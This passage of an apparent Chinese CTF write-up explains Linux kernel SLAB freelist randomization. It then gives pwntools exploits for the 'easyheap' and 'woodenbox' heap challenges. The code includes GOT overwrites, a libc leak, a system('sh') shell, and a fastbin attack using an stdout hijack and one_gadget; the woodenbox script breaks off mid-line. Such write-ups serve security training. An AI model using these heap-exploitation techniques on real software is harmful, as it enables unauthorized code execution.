class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L3"><code class="language-C"></code></li><li class="L4"><code class="language-C"><span class="pln">    err </span><span class="pun">=</span><span class="pln"> cache_random_seq_create</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> count</span><span class="pun">,</span><span class="pln"> GFP_KERNEL</span><span class="pun">);</span></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="pun">[...]</span></code></li><li class="L6"><code class="language-C"></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">s</span><span class="pun">-&gt;</span><span class="pln">random_seq</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L8"><code class="language-C"><span class="pln">        </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> i</span><span class="pun">;</span></code></li><li class="L9"><code class="language-C"></code></li><li class="L0"><code class="language-C"><span class="pln">        </span><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="pln">i </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> i </span><span class="pun">&lt;</span><span class="pln"> count</span><span class="pun">;</span><span class="pln"> i</span><span class="pun">++)</span></code></li><li class="L1"><code class="language-C"><span class="pln">            s</span><span class="pun">-&gt;</span><span class="pln">random_seq</span><span class="pun">[</span><span class="pln">i</span><span class="pun">]</span><span class="pln"> </span><span class="pun">*=</span><span class="pln"> s</span><span class="pun">-&gt;</span><span class="pln">size</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"><span class="pun">}</span></code></li><li class="L5"><code class="language-C"></code></li><li class="L6"><code class="language-C"></code></li><li class="L7"><code class="language-C"><span class="com">/* Create a random sequence per cache */</span></code></li><li class="L8"><code class="language-C"><span class="kwd">int</span><span class="pln"> cache_random_seq_create</span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> kmem_cache </span><span class="pun">*</span><span class="pln">cachep</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> count</span><span class="pun">,</span></code></li><li class="L9"><code class="language-C"><span class="pln">                    </span><span class="typ">gfp_t</span><span class="pln"> gfp</span><span class="pun">)</span></code></li><li class="L0"><code class="language-C"><span class="pun">{</span></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="kwd">struct</span><span class="pln"> rnd_state state</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">count </span><span class="pun">&lt;</span><span class="pln"> </span><span class="lit">2</span><span class="pln"> </span><span class="pun">||</span><span class="pln"> cachep</span><span class="pun">-&gt;</span><span class="pln">random_seq</span><span class="pun">)</span></code></li><li class="L4"><code class="language-C"><span class="pln">        </span><span class="kwd">return</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span></code></li><li class="L5"><code class="language-C"></code></li><li class="L6"><code class="language-C"><span class="pln">    cachep</span><span class="pun">-&gt;</span><span class="pln">random_seq </span><span class="pun">=</span><span class="pln"> kcalloc</span><span class="pun">(</span><span class="pln">count</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">sizeof</span><span class="pun">(</span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pun">),</span><span class="pln"> gfp</span><span class="pun">);</span></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(!</span><span class="pln">cachep</span><span class="pun">-&gt;</span><span class="pln">random_seq</span><span class="pun">)</span></code></li><li class="L8"><code class="language-C"><span class="pln">        </span><span class="kwd">return</span><span class="pln"> </span><span class="pun">-</span><span class="pln">ENOMEM</span><span class="pun">;</span></code></li><li class="L9"><code class="language-C"></code></li><li class="L0"><code class="language-C"><span class="pln">    </span><span class="com">/* Get best entropy at this stage of boot */</span></code></li><li class="L1"><code class="language-C"><span class="pln">    prandom_seed_state</span><span class="pun">(&amp;</span><span class="pln">state</span><span class="pun">,</span><span class="pln"> get_random_long</span><span class="pun">());</span></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"><span class="pln">    freelist_randomize</span><span class="pun">(&amp;</span><span class="pln">state</span><span class="pun">,</span><span class="pln"> cachep</span><span class="pun">-&gt;</span><span class="pln">random_seq</span><span class="pun">,</span><span class="pln"> count</span><span class="pun">);</span></code></li><li class="L4"><code class="language-C"><span class="pun">}</span></code></li><li class="L5"><code class="language-C"></code></li><li class="L6"><code class="language-C"></code></li><li class="L7"><code class="language-C"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> freelist_randomize</span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> rnd_state </span><span class="pun">*</span><span class="pln">state</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> </span><span class="pun">*</span><span class="pln">list</span><span class="pun">,</span></code></li><li class="L8"><code class="language-C"><span class="pln">                   </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> count</span><span class="pun">)</span></code></li><li class="L9"><code class="language-C"><span class="pun">{</span></code></li><li class="L0"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> rand</span><span class="pun">;</span></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="kwd">unsigned</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> i</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"></code></li><li class="L3"><code class="language-C"><span class="pln">    </span><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="pln">i </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> i </span><span class="pun">&lt;</span><span class="pln"> count</span><span class="pun">;</span><span class="pln"> i</span><span class="pun">++)</span></code></li><li class="L4"><code class="language-C"><span class="pln">        list</span><span class="pun">[</span><span class="pln">i</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> i</span><span class="pun">;</span></code></li><li class="L5"><code class="language-C"></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="com">/* Fisher-Yates shuffle */</span></code></li><li class="L7"><code class="language-C"><span class="pln">    </span><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="pln">i </span><span class="pun">=</span><span class="pln"> count </span><span class="pun">-</span><span class="pln"> </span><span class="lit">1</span><span class="pun">;</span><span class="pln"> i </span><span class="pun">&gt;</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> i</span><span class="pun">--)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L8"><code class="language-C"><span class="pln">        rand </span><span class="pun">=</span><span class="pln"> prandom_u32_state</span><span class="pun">(</span><span class="pln">state</span><span class="pun">);</span></code></li><li class="L9"><code class="language-C"><span class="pln">        rand </span><span class="pun">%=</span><span class="pln"> </span><span class="pun">(</span><span class="pln">i </span><span class="pun">+</span><span class="pln"> </span><span class="lit">1</span><span class="pun">);</span></code></li><li class="L0"><code class="language-C"><span class="pln">        swap</span><span class="pun">(</span><span class="pln">list</span><span class="pun">[</span><span class="pln">i</span><span class="pun">],</span><span class="pln"> list</span><span class="pun">[</span><span class="pln">rand</span><span class="pun">]);</span></code></li><li class="L1"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L2"><code class="language-C"><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="bqi6"><code>init_cache_random_seq()</code>函数先找出当前<code>kmem_cache</code>一个<code>slab</code>里会有多少<code>object</code>。</p><p data-anchor-id="szwe"><code>cache_random_seq_create()</code>函数会根据<code>object</code>的数量给<code>random_seq</code>数组分配内存，初始化为<code>random_seq[index]=index</code>， 然后把顺序打乱，再乘<code>object</code>的大小。</p><p data-anchor-id="uwfg">然后在每次申请新的<code>slab</code>的时候，会调用<code>shuffle_freelist()</code>函数，根据<code>random_seq</code>来把<code>freelist</code>链表的顺序打乱，这样内存申请好<code>object</code>后，下一个可以申请的<code>object</code>的地址也就变的不可预测。</p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="esk9"><ol class="linenums"><li class="L0"><code class="language-C"><span class="pln">    cur </span><span class="pun">=</span><span class="pln"> next_freelist_entry</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> page</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">pos</span><span class="pun">,</span><span class="pln"> start</span><span class="pun">,</span><span class="pln"> page_limit</span><span class="pun">,</span></code></li><li class="L1"><code class="language-C"><span class="pln">                freelist_count</span><span class="pun">);</span></code></li><li class="L2"><code class="language-C"><span class="pln">    cur </span><span class="pun">=</span><span class="pln"> setup_object</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> page</span><span class="pun">,</span><span class="pln"> cur</span><span class="pun">);</span></code></li><li class="L3"><code class="language-C"><span class="pln">    page</span><span class="pun">-&gt;</span><span class="pln">freelist </span><span class="pun">=</span><span class="pln"> cur</span><span class="pun">;</span></code></li><li class="L4"><code class="language-C"></code></li><li class="L5"><code class="language-C"><span class="pln">    </span><span class="com">//打乱顺序</span></code></li><li class="L6"><code class="language-C"><span class="pln">    </span><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="pln">idx </span><span class="pun">=</span><span class="pln"> </span><span class="lit">1</span><span class="pun">;</span><span class="pln"> idx </span><span class="pun">&lt;</span><span class="pln"> page</span><span class="pun">-&gt;</span><span class="pln">objects</span><span class="pun">;</span><span class="pln"> idx</span><span class="pun">++)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L7"><code class="language-C"><span class="pln">        </span><span class="kwd">next</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> next_freelist_entry</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> page</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">pos</span><span class="pun">,</span><span class="pln"> start</span><span class="pun">,</span><span class="pln"> page_limit</span><span class="pun">,</span></code></li><li class="L8"><code class="language-C"><span class="pln">            freelist_count</span><span class="pun">);</span></code></li><li class="L9"><code class="language-C"><span class="pln">        </span><span class="kwd">next</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> setup_object</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> page</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">next</span><span class="pun">);</span></code></li><li class="L0"><code class="language-C"><span class="pln">        set_freepointer</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> cur</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">next</span><span class="pun">);</span></code></li><li class="L1"><code class="language-C"><span class="pln">        cur </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">next</span><span class="pun">;</span></code></li><li class="L2"><code class="language-C"><span class="pln">    </span><span class="pun">}</span></code></li><li class="L3"><code class="language-C"><span class="pln">    set_freepointer</span><span class="pun">(</span><span class="pln">s</span><span class="pun">,</span><span class="pln"> cur</span><span class="pun">,</span><span class="pln"> NULL</span><span class="pun">);</span></code></li></ol></pre><div class="md-section-divider"></div><h2 data-anchor-id="nt7i" id="easyheap">easyheap</h2><div class="md-section-divider"></div><h3 data-anchor-id="1pqj" id="解题思路-1">解题思路</h3><p data-anchor-id="9i7y">创建数据块过大失败后，索引块并没有回收，同时利用fastbin申请时会残留指针</p><div class="md-section-divider"></div><h3 data-anchor-id="x2u0" id="exp-2">exp</h3><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="77aq"><ol class="linenums"><li class="L0"><code class="language-py"><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L1"><code class="language-py"><span class="kwd">import</span><span class="pln"> sys</span></code></li><li class="L2"><code class="language-py"><span class="kwd">import</span><span class="pln"> time</span></code></li><li class="L3"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">terminal </span><span class="pun">=</span><span class="pln"> </span><span class="pun">[</span><span class="str">'tmux'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'splitw'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'-h'</span><span class="pun">]</span></code></li><li class="L4"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">log_level </span><span class="pun">=</span><span class="pln"> </span><span class="str">"debug"</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">filename </span><span class="pun">=</span><span class="pln"> </span><span class="str">'./easyheap'</span></code></li><li class="L7"><code class="language-py"><span class="pln">elf </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">libc </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="str">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="pun">)#</span><span class="pln"> env </span><span class="lit">2.29</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="kwd">if</span><span class="pln"> len</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">)</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="lit">1</span><span class="pun">:</span></code></li><li class="L1"><code class="language-py"><span class="pln">    p </span><span class="pun">=</span><span class="pln"> process</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="kwd">else</span><span class="pun">:</span></code></li><li class="L3"><code class="language-py"><span class="pln">    p </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">1</span><span class="pun">],</span><span class="pln"> int</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">2</span><span class="pun">]))</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="kwd">def</span><span class="pln"> sla</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">):</span></code></li><li class="L6"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="kwd">def</span><span class="pln"> sa</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">):</span></code></li><li class="L9"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">sendafter</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"></code></li><li class="L1"><code class="language-py"><span class="kwd">def</span><span class="pln"> add</span><span class="pun">(</span><span class="pln">size</span><span class="pun">,</span><span class="pln"> content</span><span class="pun">):</span></code></li><li class="L2"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'1'</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'this message?'</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">size</span><span class="pun">))</span></code></li><li class="L4"><code class="language-py"><span class="pln">    </span><span class="kwd">if</span><span class="pln"> size </span><span class="pun">&lt;=</span><span class="pln"> </span><span class="lit">0x400</span><span class="pun">:</span></code></li><li class="L5"><code class="language-py"><span class="pln">        sla</span><span class="pun">(</span><span class="str">'the message?'</span><span class="pun">,</span><span class="pln"> content</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="kwd">def</span><span class="pln"> free</span><span class="pun">(</span><span class="pln">index</span><span class="pun">):</span></code></li><li class="L8"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'2'</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'deleted?'</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L0"><code class="language-py"></code></li><li class="L1"><code class="language-py"><span class="kwd">def</span><span class="pln"> edit</span><span class="pun">(</span><span class="pln">index</span><span class="pun">,</span><span class="pln"> content</span><span class="pun">):</span></code></li><li class="L2"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'3'</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'modified?'</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L4"><code class="language-py"><span class="pln">    sa</span><span class="pun">(</span><span class="str">'the message?'</span><span class="pun">,</span><span class="pln"> content</span><span class="pun">)</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="kwd">if</span><span class="pln"> __name__ </span><span class="pun">==</span><span class="pln"> </span><span class="str">"__main__"</span><span class="pun">:</span></code></li><li class="L8"><code class="language-py"><span class="pln">    free_got </span><span class="pun">=</span><span class="pln"> elf</span><span class="pun">.</span><span class="pln">got</span><span class="pun">[</span><span class="str">'free'</span><span class="pun">]</span></code></li><li class="L9"><code class="language-py"><span class="pln">    atoi_got </span><span class="pun">=</span><span class="pln"> elf</span><span class="pun">.</span><span class="pln">got</span><span class="pun">[</span><span class="str">'atoi'</span><span class="pun">]</span></code></li><li class="L0"><code class="language-py"><span class="pln">    puts_plt </span><span class="pun">=</span><span class="pln"> elf</span><span class="pun">.</span><span class="pln">plt</span><span class="pun">[</span><span class="str">'puts'</span><span class="pun">]</span></code></li><li class="L1"><code class="language-py"><span class="pln">    puts_got </span><span class="pun">=</span><span class="pln"> elf</span><span class="pun">.</span><span class="pln">got</span><span class="pun">[</span><span class="str">'puts'</span><span class="pun">]</span></code></li><li class="L2"><code class="language-py"><span class="pln">    system_base </span><span class="pun">=</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">symbols</span><span class="pun">[</span><span class="str">'__libc_system'</span><span class="pun">]</span></code></li><li class="L3"><code class="language-py"><span class="pln">    </span><span class="com">#sh = libc.search('/bin/sh').next() </span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0x10</span><span class="pun">,</span><span class="pln"> </span><span class="str">'a'</span><span class="pun">)#</span><span class="lit">0</span></code></li><li class="L6"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0x401</span><span class="pun">,</span><span class="pln"> </span><span class="str">'b'</span><span class="pun">)#</span><span class="lit">0</span></code></li><li class="L8"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0x401</span><span class="pun">,</span><span class="pln"> </span><span class="str">'c'</span><span class="pun">)#</span><span class="lit">1</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="pln">    edit</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> p64</span><span class="pun">(</span><span class="pln">free_got</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0x20</span><span class="pun">))</span></code></li><li class="L1"><code class="language-py"><span class="pln">    edit</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> p64</span><span class="pun">(</span><span class="pln">puts_got</span><span class="pun">))</span></code></li><li class="L2"><code class="language-py"><span class="pln">    </span><span class="com">#gdb.attach(p)</span></code></li><li class="L3"><code class="language-py"></code></li><li class="L4"><code class="language-py"><span class="pln">    edit</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> p64</span><span class="pun">(</span><span class="lit">0x6020c0</span><span class="pun">+</span><span class="lit">0x10</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0x20</span><span class="pun">))</span></code></li><li class="L5"><code class="language-py"><span class="pln">    edit</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> p64</span><span class="pun">(</span><span class="lit">0x602020</span><span class="pun">))</span></code></li><li class="L6"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">2</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'\n'</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'\n'</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"><span class="pln">    libc_base </span><span class="pun">=</span><span class="pln"> u64</span><span class="pun">(</span><span class="pln">p</span><span class="pun">.</span><span class="pln">recv</span><span class="pun">(</span><span class="lit">6</span><span class="pun">).</span><span class="pln">ljust</span><span class="pun">(</span><span class="lit">8</span><span class="pun">,</span><span class="pln"> </span><span class="str">'\x00'</span><span class="pun">))-</span><span class="lit">0x809c0</span></code></li><li class="L1"><code class="language-py"><span class="pln">    </span><span class="kwd">print</span><span class="pun">(</span><span class="str">'libc_base: '</span><span class="pun">+</span><span class="pln">hex</span><span class="pun">(</span><span class="pln">libc_base</span><span class="pun">))</span></code></li><li class="L2"><code class="language-py"><span class="pln">    system_addr </span><span class="pun">=</span><span class="pln"> system_base </span><span class="pun">+</span><span class="pln"> libc_base</span></code></li><li class="L3"><code class="language-py"><span class="pln">    edit</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> p64</span><span class="pun">(</span><span class="pln">atoi_got</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0x20</span><span class="pun">))</span></code></li><li class="L4"><code class="language-py"><span class="pln">    edit</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> p64</span><span class="pun">(</span><span class="pln">system_addr</span><span class="pun">))</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'sh'</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li></ol></pre><div class="md-section-divider"></div><h2 data-anchor-id="3pze" id="woodenbox">woodenbox</h2><div class="md-section-divider"></div><h3 data-anchor-id="tzk8" id="解题思路-2">解题思路</h3><p data-anchor-id="kfff"><strong>edit函数</strong>时没有验证 size ，存在堆溢出</p><ol data-anchor-id="ol2i">
<li>malloc 四个chunk A B C D</li>
<li>edit A，利用堆溢出把B的size改成B和C的size,</li>
<li>free B，B 进 unsorted bin，再 free C，C 进 fastbin</li>
<li>再malloc一个与B原来size相同的chunk，C的fd处存main_arena地址</li>
<li>利用edit改C的fd头两字节，改成<code>IO_2_1_stderr+157</code></li>
<li>申请过去后劫持stdout，泄露libc地址（成功概率1/16）</li>
<li>利用malloc_hook和realloc提高one_gadget的成功率</li>
</ol><p data-anchor-id="jjon"><img src="http://static.zybuluo.com/leafish/ull0t1d5zkiolnqkyd6jvrkm/image_1e3cegctudb774e9tl15d1n0q9.png" alt="image_1e3cegctudb774e9tl15d1n0q9.png-474.5kB" title=""> <br>
这里有<code>0x0000007f</code>，可以 <code>fastbin attack</code></p><p data-anchor-id="wg8i">unsortedbin、fastbin 的指针指向堆块头部，  <br>
malloc、tcache 的指针指向堆块的fd</p><div class="md-section-divider"></div><h3 data-anchor-id="lfcm" id="exp-3">exp</h3><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="fnaz"><ol class="linenums"><li class="L0"><code class="language-py"><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L1"><code class="language-py"><span class="kwd">import</span><span class="pln"> sys</span></code></li><li class="L2"><code class="language-py"><span class="kwd">import</span><span class="pln"> time</span></code></li><li class="L3"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">terminal </span><span class="pun">=</span><span class="pln"> </span><span class="pun">[</span><span class="str">'tmux'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'splitw'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'-h'</span><span class="pun">]</span></code></li><li class="L4"><code class="language-py"><span class="com">#context.log_level = "debug"</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">filename </span><span class="pun">=</span><span class="pln"> </span><span class="str">'./woodenbox2'</span></code></li><li class="L7"><code class="language-py"><span class="pln">elf </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">libc </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="str">'libc6_2.23-0ubuntu11_amd64.so'</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="kwd">if</span><span class="pln"> len</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">)</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="lit">1</span><span class="pun">:</span></code></li><li class="L1"><code class="language-py"><span class="pln">    </span><span class="com">#p = process(filename)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    </span><span class="kwd">pass</span></code></li><li class="L3"><code class="language-py"><span class="kwd">else</span><span class="pun">:</span></code></li><li class="L4"><code class="language-py"><span class="pln">    p </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">1</span><span class="pun">],</span><span class="pln"> int</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">2</span><span class="pun">]))</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="kwd">def</span><span class="pln"> sla</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">):</span></code></li><li class="L7"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="kwd">def</span><span class="pln"> sa</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">):</span></code></li><li class="L9"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">sendafter</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="kwd">def</span><span class="pln"> add</span><span class="pun">(</span><span class="pln">size</span><span class="pun">,</span><span class="pln"> name</span><span class="pun">):</span></code></li><li class="L3"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice:'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'1'</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'name:'</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">size</span><span class="pun">))</span></code></li><li class="L5"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'item:'</span><span class="pun">,</span><span class="pln"> name</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="kwd">def</span><span class="pln"> change</span><span class="pun">(</span><span class="pln">index</span><span class="pun">,</span><span class="pln"> size</span><span class="pun">,</span><span class="pln"> name</span><span class="pun">):</span></code></li><li class="L8"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice:'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'2'</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'of item:'</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L0"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'name:'</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">size</span><span class="pun">))</span></code></li><li class="L1"><code class="language-py"><span class="pln">    sa</span><span class="pun">(</span><span class="str">'the item:'</span><span class="pun">,</span><span class="pln"> 